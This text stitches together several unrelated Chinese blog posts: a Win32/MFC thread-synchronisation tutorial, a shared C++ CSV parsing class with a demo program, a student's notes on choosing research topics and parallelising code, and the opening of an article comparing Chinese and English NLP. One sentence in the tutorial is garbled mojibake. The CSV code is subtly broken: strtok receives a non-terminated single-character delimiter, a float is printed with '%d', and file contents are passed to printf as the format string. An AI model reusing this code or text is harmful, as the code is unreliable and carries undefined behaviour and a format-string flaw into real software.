信号对象允许同时对多个线程共享资源进行访问，在创建对象时指定最大可同时访问的线程数。当一个线程申请访问成功后，信号对象中的计数器减一，调用ReleaseSemaphore函数后，信号对象中的计数器加一。其中，计数器值大于或等于０，但小于或等于创建时指定的最大值。如果一个应用在创建一个信号对象时，将其计数器的初始值设为０，就阻塞了其他线程，保护了资源。等初始化完成后，调用ReleaseSemaphore函数将其计数器增加至最大值，则可进行正常的存取访问。可按下列步骤使用该对象： 
首先，创建信号对象： 
HANDLE CreateSemaphore(); 
或者打开一个信号对象： 
HANDLE OpenSemaphore(); 
然后，在线程访问共享资源之前调用WaitForSingleObject。 
共享资源访问完成后，应释放对信号对象的占用： 
ReleaseSemaphore(); 
（3）事件对象 
事件对象(Event)是最简单的同步对象，它包括有信号和无信号两种状态。在线程访问某一资源之前，需要等待某一事件的发生，这时用事件对象最合适。例如：只有在通信端口缓冲区收到数据后，监视线程才被激活。 
事件对象是用CreateEvent函数建立的。该函数可以指定事件对象的类和事件的初始状态。如果是手工重置事件，那么它总是保持有信号状钡接肦esetEvent函数重置成无信号的事件。如果是自动重置事件，那么它的状态在单个等待线程释放后会自动变为无信号的。用SetEvent可以把事件对象设置成有信号状态。在建立事件时，可以为对象命名，这样其他进程中的线程可以用OpenEvent函数打开指定名字的事件对象句柄。 
（4）排斥区对象 
在排斥区中异步执行时，它只能在同一进程的线程之间共享资源处理。虽然此时上面介绍的几种方法均可使用，但是，使用排斥区的方法则使同步管理的效率更高。 
使用时先定义一个CRITICAL_SECTION结构的排斥区对象，在进程使用之前调用如下函数对对象进行初始化: 
VOID InitializeCriticalSection(LPCRITICAL_SECTION); 
当一个线程使用排斥区时，调用函数：EnterCriticalSection或者TryEnterCriticalSection; 
当要求占用、退出排斥区时，调用函数LeaveCriticalSection，释放对排斥区对象的占用，供其他线程使用。 基于MFC的多线程编程 

MFC是微软的VC开发集成环境中提供给程序员的基础函数库，它用类库的方式将Win32 API进行封装，以类的方式提供给开发者。由于其快速、简捷、功能强大等特点深受广大开发者喜爱。因此，建议使用MFC类库进行应用程序的开发。 
在VC++附带的MFC类库中，提供了对多线程编程的支持，基本原理与基于Win32 API的设计一致，但由于MFC对同步对象做了封装，因此实现起来更加方便，避免了对象句柄管理上的烦琐工作。 
在MFC中，线程分为两种：工作线程和用户接口线程。工作线程与前面所述的线程一致，用户接口线程是一种能够接收用户的输入、处理事件和消息的线程。 1. 工作线程 

工作线程编程较为简单，设计思路与前面所讲的基本一致: 一个基本函数代表了一个线程，创建并启动线程后，线程进入运行状态; 如果线程用到共享资源，则需要进行资源同步处理。这种方式创建线程并启动线程时可调用函数： 


CWinThread*AfxBeginThread( AFX_THREADPROC pfnThreadProc, LPVOID pParam,int nPriority= THREAD_PRIORITY_NORMAL,UINT nStackSize =0,DWORD dwCreateFlags=0, LPSECURITY_ATTRIBUTES lpSecurityAttrs = NULL);参数pfnThreadProc是线程执行体函数，函数原形为: UINT ThreadFunction( LPVOID pParam)。 
参数pParam是传递给执行函数的参数； 
参数nPriority是线程执行权限，可选值： 
THREAD_PRIORITY_NORMAL、THREAD_PRIORITY_LOWEST、THREAD_PRIORITY_HIGHEST、THREAD_PRIORITY_IDLE。 
参数dwCreateFlags是线程创建时的标志，可取值CREATE_SUSPENDED，表示线程创建后处于挂起状态，调用ResumeThread函数后线程继续运行，或者取值“0”表示线程创建后处于运行状态。 
返回值是CWinThread类对象指针，它的成员变量m_hThread为线程句柄，在Win32 API方式下对线程操作的函数参数都要求提供线程的句柄，所以当线程创建后可以使用所有Win32 API函数对pWinThread->m_Thread线程进行相关操作。 
注意：如果在一个类对象中创建和启动线程时，应将线程函数定义成类外的全局函数。 2. 用户接口线程 

基于MFC的应用程序有一个应用对象，它是CWinApp派生类的对象，该对象代表了应用进程的主线程。当线程执行完并退出线程时，由于进程中没有其他线程存在，进程自动结束。类CＷinApp从CＷinThread派生出来，CＷinThread是用户接口线程的基本类。我们在编写用户接口线程时，需要从CＷinThread派生我们自己的线程类，ClassWizard可以帮助我们完成这个工作。 
先用ClassWizard派生一个新的类，设置基类为CwinThread。注意：类的DECLARE_DYNCREATE和IMPLEMENT_DYNCREATE宏是必需的，因为创建线程时需要动态创建类的对象。根据需要可将初始化和结束代码分别放在类的InitInstance和ExitInstance函数中。如果需要创建窗口，则可在InitInstance函数中完成。然后创建线程并启动线程。可以用两种方法来创建用户接口线程，MFC提供了两个版本的AfxBeginThread函数，其中一个用于创建用户接口线程。第二种方法分为两步进行：首先，调用线程类的构造函数创建一个线程对象；其次，调用CWinThread::CreateThread函数来创建该线程。线程建立并启动后，在线程函数执行过程中一直有效。如果是线程对象，则在对象删除之前，先结束线程。CWinThread已经为我们完成了线程结束的工作。 
3. 线程同步 

前面我们介绍了Win32 API提供的几种有关线程同步的对象，在MFC类库中对这几个对象进行了类封装，它们有一个共同的基类CSyncObject，它们的对应关系为: Semaphore对应CSemaphore、Mutex对应CMutex、Event对应CEvent、CriticalSection对应CCriticalSection。另外，MFC对两个等待函数也进行了封装，即CSingleLock和CMultiLock。因四个对象用法相似，在这里就以CMutex为例进行说明： 
创建一个CMutex对象: 
CMutex mutex(FALSE,NULL,NULL); 
或CMutex mutex; 
当各线程要访问共享资源时使用下面代码： 
CSingleLock sl(&mutex); 
sl.Lock(); 
if(sl.IsLocked()) 
//对共享资源进行操作... 
sl.Unlock(); 
结束语 

如果用户的应用程序需要多个任务同时进行相应的处理，则使用多线程是较理想的选择。这里，提醒大家注意的是在多线程编程时要特别小心处理资源共享问题以及多线程调试问题







经常需要使用excel，或者把有的数据用excel打开，程序可以生成cvs格式的文件，这样就可以excel打开并处理了，于是找了一个处理cvs的c++类跟大家分享
代码出处找不到了：

 
代码如下：
 
StringParser.h
#pragma once
#include <process.h>
#include <Windows.h>
#include <map>
#include <vector>
#include <queue>
#include <set>
#include <string>
#include <list>

typedef char                    i8;
typedef unsigned char           u8;
typedef short                  i16;
typedef unsigned short          u16;
typedef long int                i32;
typedef unsigned long           u32;



namespace StringParser{







//从分隔符中获得数据
inline int GetParamFromString(std::string Str, std::vector<i32>& IntVec, char Delim = ',')
{
    char* p = strtok((char*)Str.c_str(), &Delim); 
    while (p)
    {
        IntVec.push_back(atoi(p));
        p = strtok(NULL, &Delim); 
    }
    return IntVec.size();
}

inline int GetParamFromString(std::string Str, std::vector<float>& FloatVec, char Delim = ',')
{
    char* p = strtok((char*)Str.c_str(), &Delim); 
    while (p)
    {
        FloatVec.push_back(atof(p));
        p = strtok(NULL, &Delim); 
    }
    return FloatVec.size();
}

inline int GetParamFromString(std::string Str, std::vector<u32>& uiIntVec, char Delim = ',')
{
    char* p = strtok((char*)Str.c_str(), &Delim); 
    while (p)
    {
        uiIntVec.push_back(strtoul(p, NULL, 10));
        p = strtok(NULL, &Delim); 
    }
    return uiIntVec.size();
}

inline int GetParamFromString(std::string Str, std::vector<std::string>& StringVec, char Delim = ',')
{
    char* p = strtok((char*)Str.c_str(), &Delim); 
    while (p)
    {
        std::string buffer = p;
        StringVec.push_back(buffer);
        p = strtok(NULL, &Delim); 
    }
    return StringVec.size();
}

//以左右符号得到括号中的数据ex:[3.1415;0.125][1000;9999]
template<typename T>
int GetParamFromArea(std::string Str, std::vector<std::vector<T> >& IntVec, char left = '[', char right = ']', char Delim = ';')
{
    char* pTarget = (char*)Str.c_str();
    for (;;)
    {
        char* pLeft = strchr(pTarget, left);
        char* pRight = strchr(pTarget, right);
        if (pLeft && pRight)
        {
            std::string strbuff;
            strbuff.insert(0, ++pLeft, pRight-pLeft);

            std::vector<T> Intbuff;
            if (GetParamFromString(strbuff, Intbuff, Delim))
            {
                IntVec.push_back(Intbuff);
            }
            pTarget = ++pRight;
        }
        else
        {
            break;
        }
    }
    return IntVec.size();
}









};

CCSVOperator.h
 
#pragma once
#include "StringParser.h"



class CCSVOperator
{

public:
    CCSVOperator(){};
    ~CCSVOperator(){};
    CCSVOperator(const char* path);


    bool LoadCSV(const char* path);
    bool SaveCSV(const char* path = NULL);

    bool GetInt(u32 uiLine, u32 uiRow, int& iValue);
    bool GetFloat(u32 uiLine, u32 uiRow, float& fValue);
    std::string* GetString(u32 uiLine, u32 uiRow);
    bool SetNumber(u32 uiLine, u32 uiRow, int iValue);
    bool SetNumber(u32 uiLine, u32 uiRow, float fValue);
    bool SetString(u32 uiLine, u32 uiRow, const char* pStr);
    std::map<u32, std::map<u32, std::string> >& GetCSVMap(){return m_StringKeyMap;}

protected:
    std::string m_CSVName;
    std::map<u32, std::map<u32, std::string> > m_StringKeyMap;
public:
	int indexOfLines;	//行数
	int indexOfColumn;	//列数,有可能出现列长不一样的情况

};



 
 
 
CSVOperator.cpp
#include "CSVOperator.h"


//////////////////////////////////////////////////////////////////////////
//CSV operator

CCSVOperator::CCSVOperator(const char* path)
{
    LoadCSV(path);
}

bool CCSVOperator::LoadCSV(const char* path)
{
	 indexOfLines = 0;	
	 indexOfColumn = 0;
    FILE* pfile = fopen(path, "r");
    if (pfile)
    {
        fseek(pfile,0,SEEK_END);
        u32 dwsize = ftell(pfile);
        rewind(pfile);// 指针回到文件开头

        char* filebuffer = new char[dwsize];
        fread(filebuffer, 1, dwsize, pfile);

        std::map<u32, std::string> StringMap;
        char* pBegin = filebuffer;
        char* pEnd = strchr(filebuffer, '\n');//查找换行首次出现的位置
        u32 uiIndex = 1;
        while (pEnd != NULL)
        {
            std::string strbuff;
            strbuff.insert(0, pBegin, pEnd-pBegin);
            if (!strbuff.empty())
            {
                StringMap[uiIndex] = strbuff;
            }
            pBegin = pEnd + 1;
            pEnd = strchr(pEnd + 1, '\n');
            ++uiIndex;
        }

		indexOfLines = uiIndex - 1;

        delete[] filebuffer;

        std::map<u32, std::string>::iterator iter = StringMap.begin();
        for (; iter != StringMap.end(); ++iter)
        {
            std::vector<std::string> StringVec;
            std::map<u32, std::string> l_StringMap;
            StringParser::GetParamFromString(iter->second, StringVec);

			if (indexOfColumn< StringVec.size())
			{
				indexOfColumn = StringVec.size();//保存最大的列数
			}
			
            for (int i = 0; i < StringVec.size(); ++i)
            {
                l_StringMap[i+1] = StringVec.at(i);
            }
			
            m_StringKeyMap[iter->first] = l_StringMap;
        }
        fclose(pfile);
        m_CSVName = path;
        return true;
    }

    return false;
}


bool CCSVOperator::GetInt(u32 uiLine, u32 uiRow, int& iValue)
{
    std::string* pKey = GetString(uiLine, uiRow);
    if (pKey)
    {
        iValue = atoi(pKey->c_str());
        return true;
    }
    else
    {
        return false;
    }
}

bool CCSVOperator::GetFloat(u32 uiLine, u32 uiRow, float& fValue)
{
    std::string* pKey = GetString(uiLine, uiRow);
    if (pKey)
    {
        fValue = atof(pKey->c_str());
        return true;
    }
    else
    {
        return false;
    }
}

std::string* CCSVOperator::GetString(u32 uiLine, u32 uiRow)
{
    std::map<u32, std::map<u32, std::string> >::iterator iterLine = m_StringKeyMap.find(uiLine);
    if (iterLine != m_StringKeyMap.end())
    {
        std::map<u32, std::string>& rStringMap = iterLine->second;
        std::map<u32, std::string>::iterator iterRow = rStringMap.find(uiRow);
        if (iterRow != rStringMap.end())
        {
            return &iterRow->second;
        }
        else
        {
            return NULL;
        }
    }
    else
    {
        return NULL;
    }
}

bool CCSVOperator::SetNumber(u32 uiLine, u32 uiRow, int iValue)
{
    std::string* pKey = GetString(uiLine, uiRow);
    if (pKey)
    {
        char buffer[100];
        memset(buffer, 0, sizeof(buffer));
        sprintf(buffer, "%d", iValue);
        pKey->clear();
        *pKey = buffer;
        return true;
    }
    else
    {
        return false;
    }
}

bool CCSVOperator::SetNumber(u32 uiLine, u32 uiRow, float fValue)
{
    std::string* pKey = GetString(uiLine, uiRow);
    if (pKey)
    {
        char buffer[100];
        memset(buffer, 0, sizeof(buffer));
        sprintf(buffer, "%d", fValue);
        pKey->clear();
        *pKey = buffer;
        return true;
    }
    else
    {
        return false;
    }
}

bool CCSVOperator::SetString(u32 uiLine, u32 uiRow, const char* pStr)
{
    std::string* pKey = GetString(uiLine, uiRow);
    if (pKey)
    {
        pKey->clear();
        *pKey = pStr;
        return true;
    }
    else
    {
        return false;
    }
}

bool CCSVOperator::SaveCSV(const char* path)
{
    if (path != NULL)
    {
        m_CSVName = path;
    }

    FILE* pfile = fopen(m_CSVName.c_str(), "w");
    if (pfile)
    {
        std::map<u32, std::map<u32, std::string> >::iterator iter = m_StringKeyMap.begin();
        for (; iter != m_StringKeyMap.end(); ++iter)
        {
            std::map<u32, std::string>& rStringMap = iter->second;
            std::map<u32, std::string>::iterator it = rStringMap.begin();
            for (; it != rStringMap.end(); ++it)
            {
                std::string key = it->second;
                key += ',';
                fwrite(key.c_str(), 1, key.size(), pfile);
            }
            char Delim = '\n';
            fwrite(&Delim, 1, 1, pfile);
        }
        fclose(pfile);
    }
    else
    {
        return false;
    }

    return true;
}

 
CVS_OP.CPP
 
// CSV_OP.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "CSVOperator.h"
#include <iostream>
using namespace std;

int _tmain(int argc, _TCHAR* argv[])
{

    CCSVOperator CSVOperator;
    CSVOperator.LoadCSV("画图数据.csv");

	cout<<"line:  "<<CSVOperator.indexOfLines<<endl;
	cout<<"column:  "<<CSVOperator.indexOfColumn<<endl;

    std::string* pString = CSVOperator.GetString(1,600);
    if (pString)
    {
        std::cout<< pString->c_str() << '\n';
    }

    pString = CSVOperator.GetString(2,4);
    if (pString)
    {
        std::cout<< pString->c_str() << '\n';
    }

	//std::string* pString = NULL;
	int j = 0;
	for (int i = 0,nColConut = CSVOperator.indexOfColumn;i < nColConut ; ++i)
	{
		if(pString = CSVOperator.GetString(1,i+1))
		{
			//m_listctrl.InsertColumn(j ,pString->c_str(), LVCFMT_CENTER, 50);  // 添加第1列，
			//cout<<"\t"<<&pString;
			cout<<"\t";
			printf(pString->c_str());
			++j;
		}
	}

    
//     int _int = 0;
//     if (CSVOperator.GetInt(3,1,_int))
//     {
//         std::cout<< _int <<'\n';
//     }
// 
     float _float = 0.0f;
     if (CSVOperator.GetFloat(4,1, _float))
    {
        std::cout<< _float<<'\n';
     }


    system("pause");
	return 0;
}



效果如下：
 

 






    
    最近想要找点新的点子来优化之前看到的一些立体匹配论文，我之前一直是用图割做立体匹配，刚开始时候用图割做图像分割，后来发现这块都被人做烂了，继续往下看发现图割还能搞立体匹配，效果也挺好。但是后面发现掉大坑里面了。

1.什么是好的research
这篇文章中写到什么是好的research？这篇文章中有讲到（看到的有点晚了）
http://www.52cs.org/?p=632

    创新性高，性能差：俗称的“挖坑”的工作。这样的工作包括提出一个全新的问题或者对一个已有问题的全新解法。这样的工作虽然可能在文章中只提出了非常简单的baseline，或性能并不能比过最好的已有方法，但是可以启发大量后续的research。
很显然用图割算法进行立体匹配就属于这种工作。

    在没有综合对比其他全局优化算法，或者办全局优化算法的时候，我就贸然继续采用图割算法进行立体匹配的工作，仅仅是因为之前看了图割算法，这不能不说是硕士阶段方向性选择的一大失误。

2.科研方向的选择（对于研究生而言尽量选择一个点）
    而我因为不懂科研方向的选择在图割算法立体匹配上下去，现在想想，什么是选择在硕士阶段科研题目的正确方法呢？我觉的对于一般院校的学生来说，应该是一些在小处上能够改进的题目，比如图像分割，人脸表情识别，深度图像增强这种有成熟框架可以替换算法实质内容，又实验方便的科目。
    比如讲图像分割，用聚类算法进行分割，模糊k均值，或者引入图论的相关算法多做些实验，国内的核心期刊还是很好水的。
而对于立体匹配这种偏系统性工程性科研题目。而且在没有师兄师姐代码或者理论基础的情况下，光是自己找代码，自己找例程就
 
 
非常耗费时间。

3.有关图形图像领域的万金油灌水（串行改并行）

    图形图像处理在国内国际有一个万金油灌水领域，其实也可以说是一个偷懒的领域，就是将传统算法并行化处理，下面说说我的思路。如何找到并识别并行的机会呢。最好的方法是用代码性能分析工具分析代码，对cpu占用率较高的部分单独拉出来来。代码分析可以在windows下面用amd的codexl，直接对应exe就能分析出来代码所在的瓶颈。或者用visual studio自带的analysis，或者linux下面免费的oprofile
 
比如下图我随便找了一个立体匹配的程序在codexl中跑过一遍后下面是分析的结果：可以看到热点函数和代码都给找出来了。这就是我们通常说的：
性能分析引导优化（profile-guided optimization）
 


看到程序27%的时间卡在了一个内联函数的直方图相加上。


    可以直接下载一个Intel parallel studio XE 2016之后在vs2010中打开tools运行优化选项，说明文档：
file:///C:/Program%20Files%20(x86)/IntelSWTools/documentation_2016/en/compiler_c/ps2016/get_started_wc.htm
 

如果按照学生身份来注册的话，是免费使用一年的：点击打开链接 

  采用intel 编译器的优化，intel编译器安装好之后在windows下有两种运行方式，一种是命令行，一种是作为visual studio 2010的一个插件工具：
 
 


运行时候需要根据并行优化向导进行一步步配置优化，这基本也算是傻瓜式的优化，其实主要能用到的就是两部分，编译优化和，分析引导优化：



注意到开启不同选项，其优化时间是不同的，甚至更慢：

 



寻找并行化的机会之二：
    检查应用程序中的关键路径。关键路径是确定任务可以在最短时间内完成的一组步骤。下图中显然任务c可以和任务a和b并行。

 
 
 
 
 

 
要点：
      除非应用程序用于可并行化代码的时间超过其运行时间的一半，否则其可扩展性有限。我们用profile分析的时候，程序热点代码运行时间在25%-30%以上才有明显的优化效果。
 
 
真正能够缩短的运行时间，amdahl定律：




参考文献：

戈夫. 多核应用编程实战[M]. 人民邮电出版社, 2013.
 








作者 | 达观数据创始人 陈运文
文章大纲一、中英文分词方式不同二、英文语素和中文偏旁的使用三、词性标注方法的差异四、标点符号和字体特征五、词汇粒度的处理方法差异六、句法结构分析方法异同七、中文英文指代消解处理八、英汉语词汇间关联关系挖掘九、中英文省略和内容补足的处理十、歧义问题与子串转义处理中英文NLP差异总结

人类经过漫长的历史发展，在世界各地形成了很多不同的语言分支，其中汉藏语系和印欧语系是使用人数最多的两支。英语是印欧语系的代表，而汉语则是汉藏语系的代表。中英文语言的差异十分鲜明，英语以表音（字音）构成，汉语以表义（字形）构成，印欧和汉藏两大语系有很大的区别。

尽管全世界语言多达5600种，但大部数人类使用的语言集中在图中的前15种（覆盖全球90%以上人群）。其中英语为母语和第二语的人数最多，近14亿人，是事实上的世界通用语。其次是汉语，约占世界人口的23%。英语和汉语相加的人数占世界总人数的近一半，因此处理中英文两种语言非常关键。

人工智能时代，让计算机自动化进行文字语义理解非常重要，广泛应用于社会的方方面面，而语言本身的复杂性又给计算机技术带来了很大的挑战，攻克文本语义对实现AI全面应用有至关重要的意义。相应的自然语言处理（Natural Language Processing，NLP）技术因而被称为是“人工智能皇冠上的明珠”。
中国和美国作为AI应用的两个世界大国，在各自语言的自动化处理方面有一些独特之处。接下来笔者对中文和英文语言特点的角度出发，结合自己的从业经验来归纳下两种语言下NLP的异同点。

一、中英文分词方式不同
分词是中英文NLP差异最广为人知的一点。我们都知道英文的单词之间天然存在空格来分隔，因此在进行英文文本处理时，可以非常容易的通过空格来切分单词。例如英文句子：
DataGrand is a Chinese company
可轻松切分为DataGrand / is / a / Chinese / company （文本用/表示词汇分隔符）。
中文在每句话中间是不存在分隔符的，而是由一串连续的汉字顺序连接构成了句子。现代汉语里表达意思的基本语素是词而不是字。例如“自然”，拆为“自”和“然”都不能单独表意，两个字合并组成的词才能有准确的意义，对应英文单词是Nature。因此在我们使用计算机技术对中文进行自动语义分析时，通常首要操作就是中文分词（Chinese Word Segmentation）。中文分词是指按人理解汉语的方式，将连续的汉字串切分为能单独表义的词汇。例如中文句子：
“达观数据是一家中国公司。”
让计算机来处理，第一步需要切分为“达观数据/是/一家/中国/公司”这样的词串的形式，然后再进行后续的理解和处理。
如何正确的根据语义完成中文切分是一个挑战性的任务，一旦切词发生失误，会导致后续的文本处理产生连锁问题，给正确理解语义带来障碍。为了快速准确的切分好中文，学术界迄今有超过50年的研究，提出了很多方法。中文切词常见方法里既有经典的机械切分法（如正向/逆向最大匹配，双向最大匹配等），也有效果更好一些的统计切分方法（如隐马尔可夫HMM，条件随机场CRF），以及近年来兴起的采用深度神经网络的RNN，LSTM等方法。
由于汉语语法本身极为灵活，导致歧义语义时常发生，给正确完成中文分词带来了很多障碍。如例句“严守一把手机关了”所示，按照语义理解，正确切分方式为“严守一/把/手机/关了”，而算法有误时容易切分为“严守/一把/手机/关了”。
更困难的是，有些时候两种切词方法意思都对，例如“乒乓球拍卖了”，切分为“乒乓/球拍/卖了”和“乒乓球/拍卖/了”本身都可行，必须要依赖更多上下文来选择当前正确的切分方法。类似的还有“南京市长江大桥”、“吉林省长春药店”等等。如果把“市长”“省长”等切出来，整句话的理解就偏差很多了。常见歧义类型包括交叉歧义（Cross Ambiguity）和组合歧义（Combination Ambiguity）等，在语义消岐方面近年不断有国内外学者提出新的解决思路，来解决汉藏语系的这个特定问题。
此处顺便一提，和中文类似，日文句子内部同样缺乏天然的分隔符，因此日文也同样存在分词需求。日文受汉语语法的影响很深，但同时又受表音语法的影响，明治时代还曾兴起过废汉字兴拼音的运动，行文上汉字和假名混杂，好比中英文混血儿。业内比较知名的日文分词器有MeCab，其算法内核是条件随机场CRF。事实上，如果将MeCab的内部训练语料由日文更换为中文后，也同样可以用于切分中文。
随着深度学习技术近年来在NLP领域成功的应用，一些seq2seq学习过程可以不再使用分词，而是直接将字作为输入序列，让神经网络自动学习其中的特征，这在一些端到端的应用中（如自动摘要、机器翻译、文本分类等）确实省略了中文分词这一步骤，但是一方面还有很多的NLP应用离不开分词的结果，如关键词提取、命名实体识别、搜索引擎等；另一方面切分所得的词汇也可以和单字一起作为特征输入，用以增强效果。因此分词仍然是工程界进行中文处理时的一项重要技术。

二、英文语素和中文偏旁的使用
英文单词的提取虽然比中文简单的多，通过空格就能完整的获取单词，但英文特有的现象是单词存在丰富的变形变换。为了应对这些复杂的变换，英文NLP相比中文存在一些独特的处理步骤，我们称为词形还原（Lemmatization）和词干提取（Stemming）。
词形还原是因为英文单词有丰富的单复数、主被动、时态变换（共16种）等情况，在语义理解时需要将单词“恢复”到原始的形态从而让计算机更方便的进行后续处理。例如“does，done，doing，do，did”这些单词，需要通过词性还原统一恢复为“do”这个词，方便后续计算机进行语义分析。类似的：“potatoes，cities，children，teeth”这些名词，需要通过Lemmatization转为“potato，city，child，tooth”这些基本形态；同样“were，beginning，driven”等要转为“are，begin，drive”。
请注意词形还原通常还需要配合词性标注（pos-tag）一起来进行，以确保还原准确度，避免歧义发生。因为英文中存在一些多义词的情况，例如calves就是个多义词，即可以作为calf（名词，牛犊）的复数形式，也可以是calve（动词，生育小牛）的第三人称单数。所以词形还原也有两种选择，需要按实际所表示的词性来挑选合适的还原方法。

词干提取（Stemming）是英文中另一项独有的处理技术。英文单词虽然是句子中的基础表义单元，但并非是不可再分的。英文单词内部都是由若干个词素构成的。词素又分为词根（roots）和词缀（前缀prefix或后缀suffix），而词根的原形称为词干（stems）。例如单词disability，dis-就是表示否定意思的常用前缀，-lity是名词常用后缀，able是表示“能力”的词干，这些词素合并在一起就构成了单词的含义。
英文的词素种类非常多（最常用的有300多个），很多源自拉丁语和希腊文。提取词素对理解英文单词的含义起着非常重要的作用，例如semiannually这个单词，可能有的朋友并不认识，如果通过词素来看：前缀semi-表示“一半”的意思，词干annul表示年，-ly是副词后缀，semiannually这个单词的含义是“每半年进行一次的”。
Ambidextrous，heterophobia，interplanetary，extraterritorial等这些看着很复杂的词汇，通过拆解词干的方法能很方便的把握单词含义，对人类和对计算机来说都是如此。常见Stemming方法包括Porter Stemming Algorithm, Lovins Algorithm和Lancaster(Paice/Husk) Algorithm。目前大部分英文NLP系统都包括词形还原（Lemmatization）和词干提取（Stemming）模块。（陈运文）
相比英文，中文里是没有词干的概念的，也无需进行词干提取，这是中文NLP中相对简便的一块。但在中文里有一个相近的概念是偏旁部首。和英文中“单词不懂看词干”类似，中文里“汉字不识看偏旁”。例如“猴、狗、猪、猫、狼”这些汉字，显然都是动物名词。当出现汉字“狁”时，即使不认识也能通过部首“犭”猜出这是一个动物名称，且发音类似“允”字。再比如“木，林，森”这些字都和树木相关，数量还递增。“锁、锡、银、镜、铁、锹”都和金属有关。“采”字和手抓植物有关。“囚”字和“孕”字就更直观形象了。
借鉴英文中词干提取的方法，很多人自然会立刻想到：是否我们拆分中文汉字的偏旁部首，作为特征输入，也能更好的帮助计算机理解中文语义呢？学术界确实也有人做过此类尝试，但是整体收益都不像英文词干分析那么明显，这背后的原因是什么呢？
笔者认为，其原因首先是常用汉字的数量远比英文单词要少，相比英文单词数量动辄数万计，加上各种前后缀和词形变换数量更多，中文汉字最常用的才过千个。因为字少，每个汉字的意思多，这些汉字的含义通过上下文来获取的语义描述信息足够充分，拆分偏旁后额外再能添补的信息作用非常小。即便对罕见字来说偏旁确实能额外补充特征，但因为它们在日常文本中出现频次太少，对整体文本语义理解的作用很有限，只有在一些专业性文书的应用上可能起少量帮助。
其次是汉字经过数千年的演化，再加上简化字的使用，很多字形和含义已经发生了巨大变化，偏旁未必能准确表达字的意思，甚至使用偏旁可能还会引入一些噪声特征。第三是现代汉语里表义的基本单元是多个汉字构成的词，而不是单字。这和英文中表义单元是单词完全不同。因此对单个汉字的偏旁处理对整个中文NLP起到的作用非常轻微，并未成为中文NLP里常用的做法。

三、词性标注方法的差异
词性是语言学的一个概念，根据上下文将每个词根据性质划归为特定的类型，例如n.名词 v.动词 adj.形容词 adv.副词等就是最常见的几类词性。中英文的词性尽管整体相似，例如表达一个物品（如苹果Apple，火车Train）通常是名词，而描述一个动作（如跑步Run，打开Open）一般是动词，但在很多细节上存在差异。如果计算机能够对每个词汇的词性进行正确的识别，无疑对增强语义分析的效果有帮助（注：同样在seq2seq里词性并不必须，但是对词性的正确理解仍然有其特定价值）。
在NLP里有技术分支称为词性标注（Part-Of-Speech tagging, POS tagging），中英文各自有其特点。

其一是英文中有一些中文所没有的词性。这些词性大量存在，给语义理解带来了很好的指引作用。其中最典型的就是英文特有的两个词性：一是冠词，二是助动词。中文里没有冠词一说，在英文中冠词（Article，一般简称art.）也是词性最小的一类，只有三个：不定冠词（Indefinite art.）、定冠词（Definite art.）和零冠词（Zero art.）。如英文中无处不在的单词“the”就是定冠词，the后面通常会紧跟着出现句子的关键名词+介词短语。例如“Show me the photo of your company”，通过定冠词the的指示，很容易的定位本句话的关键实词是photo。
类似的，前面例句“DataGrand is a Chinese company”里“a”这样的不定冠词也可以很好的指示出宾语“company”。这些大量出现的冠词虽然是虚词，本身并没有明确含义，但在NLP中用于定位句子中的关键实词，判断实词种类（是否可数，是否专有名词等），进而识别出句法结构（后面还会详细介绍）等，起到了很大的指示作用，也降低了计算机进行语义理解的难度，因而这方面英文比中文有先天优势。
助动词（Auxiliary Verb）也是英文特有的现象，助动词的作用是协助主要动词构成谓语词组，如am, is, have, do, are, will, shall, would,should, be going to等都是常见助动词，在英文句子中也大量存在，和冠词用于指示主语宾语类似，助动词对识别主要动词（Main Verb）和谓语会起帮助。
其次，英文在词性方面的划分和使用更严谨，词汇在变换词性的时候会在词尾形成丰富的变化。例如-ing、-able、-ful、-ment、-ness等都对确认词性给出具体的提示。名词中还会进一步区分可数名词、不可数名词，在词尾用-s、-es来区分。动词也同样会存在发生时态的指示，过去式，现在时，未来时等非常明确，因此在英文语法中几乎没有词性混淆不清的情况发生。
而中文的词性则缺乏类似英文这样的明确规范。中国著名的语言学家沈家煊先生在著作《语法六讲》中就曾提出“汉语动词和名词不分立”的观点，将确认汉语词性的问题描述为“词有定类”则“类无定职”，而“类有定职”则“词无定类”。和英文中名词、动词、形容词三大类词汇相互独立的“分立模式”不同，中文更类似“包含模式”，即形容词作为一个次类包含在动词中，动词本身又作为次类被名词包含，而且这个词性的转换过程非常微妙，缺乏表音语言中的前后缀指示。
例如“他吃饭去了”中“吃饭”是动词，只需要句式稍加变换为“他吃饭不好”，此时“吃饭”就摇身一变成名词了。“热爱编程”、“挖掘数据”中，“编程”、“挖掘”等词，既可以是名词也可以是动词。形容词也有类似的情况，如“活跃”是个常见的形容词，常用句为“他表现非常活跃”。但有时也可以变身为动词“他去活跃气氛”，还能变为名词“活跃是一种行为习惯”。可见汉语语境的变化给词性带来非常微妙的变化。
汉语没有英文的屈折变化的特点，不像英语能通过灵活的词尾变化来指示词性变化，汉语这种一词多性且缺乏指示的特点，给计算机词性标注带来了很大的困难，业界对词性的标准以及标准测试集也很不完善。很多具体词汇的词性甚至让人工来研读都模棱两可，让算法自动来识别就更难了。
例如：“他很开心”、“他逗她开心”、“他开心不起来”、“他开心的很”、“开心是他很重要的特点”，这里“开心”的词性让人来判断都很难搞明白，甚至存在争议。而反观英语里一个词被标为动词还是名词几乎不存在争议。对这些模糊的情况，一些中文语料标注库里干脆用“动名词vn”、“形名词an”等来标记，搁置争议，模糊处理。
在目前中文NLP词性标注中，“名动形”糊在一起的特点仍然没有找到特别好的处理手段，也给后面的句法结构分析，词汇重要性判断，核心关键词提取等语义理解课题带来了干扰。

四、标点符号和字体特征
在自然语言处理应用中，很容易被忽略的是标点和字体等信息的利用。尤其学术界研究核心算法时一般都会忽略这些“次要”信息，大部分学术测试集合干脆是没有字体信息的，标点也不讲究。但是在实际工程应用中，这些信息能起不小的作用。而英汉语在其使用方面也存在一些差异。标点（如？！：——。等）和字体（字母大小写，斜体，粗体等）虽然本身没有具体语义，但在辨识内容时起重要的引导作用。不妨让我们想像一下，如果把我这篇文章里所有标点、分段、标题字体等都去掉，让人来阅读理解本文内容，难度是不是立刻会加大很多？若是换成计算机来读那就更麻烦了。
在英语中（尤其是书面语中），逗号和句号的使用有明确规范，一句话结尾要求必须用句号符“.”，并且下一句话的第一个单词的首字母要求大写。英文中从句非常多，从句之间要求用逗号“,”连接，以表示语义贯通。不仅如此，当一句话的主谓宾完整出现后，如果下一句话也同样是一个完整句子，则两句话中间或者需要用连词（如and, or, therefore, but, so, yet, for, either等）连接，或者必须用句号“.”分割，如果中间用“,”且没有连接词，则属于正式文书中的用法错误。如：
